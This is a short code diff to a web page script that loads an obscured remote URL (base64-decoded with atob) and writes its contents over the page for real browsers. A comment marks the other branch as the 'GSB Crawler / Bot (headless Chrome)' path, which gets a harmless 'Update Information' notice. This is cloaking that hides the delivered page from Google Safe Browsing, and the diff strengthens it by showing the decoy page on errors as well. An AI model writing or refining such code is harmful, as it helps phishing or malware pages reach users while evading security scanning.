@@ -11,16 +11,24 @@
 
         if (self.Notification) {
             fetch(atob(realContent))
-                .then(response => response.text())
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Failed to load content');
+                    }
+                    return response.text();
+                })
                 .then(html => {
                     document.open();
                     document.write(html);
                     document.close();
                 })
                 .catch(err => {
-                    console.error('Error loading content');
+                    console.error('Error loading content:', err);
+                    // Show benign content on error instead of failing silently
+                    document.write('<h1>Update Information</h1><p>Please check back later for updates.</p>');
                 });
         } else {
+            // GSB Crawler / Bot (headless Chrome) - Show benign content
             document.write('<h1>Update Information</h1><p>Please check back later for updates.</p>');
         }
     </script>
